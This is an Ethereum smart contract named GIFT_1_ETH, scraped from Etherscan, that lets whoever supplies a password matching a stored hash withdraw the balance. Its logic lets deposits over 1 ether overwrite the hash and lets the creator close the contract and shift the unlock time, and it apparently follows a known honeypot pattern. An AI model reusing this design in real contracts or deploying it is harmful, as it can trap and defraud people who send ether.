//token_name	
//token_url	https://etherscan.io//address/0x5DAC036595568Ff792f5064451b6B37e801ecaB9#code
//spider_time	2018/07/08 12:02:11
//token_Transactions	6 txns
//token_price	

pragma solidity ^0.4.19;

contract GIFT_1_ETH
{
    bytes32 public hashPass;
    
    bool closed = false;
    
    address sender;
 
    uint unlockTime;
 
    function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
            unlockTime = now;
        }
    }
    
    function SetGiftTime(uint date)
    public
    {
        if(msg.sender==sender)
        {
            unlockTime = date;
        }
    }
    
    function GetGift(bytes pass)
    external
    payable
    canOpen
    {
        if(hashPass == keccak256(pass))
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function Revoce()
    public
    payable
    canOpen
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(hash==hashPass&&msg.sender==sender)
        {
           closed=true;
        }
    }
    
    modifier canOpen
    {
        require(now>unlockTime);
        _;
    }
    
    function() public payable{}
    
}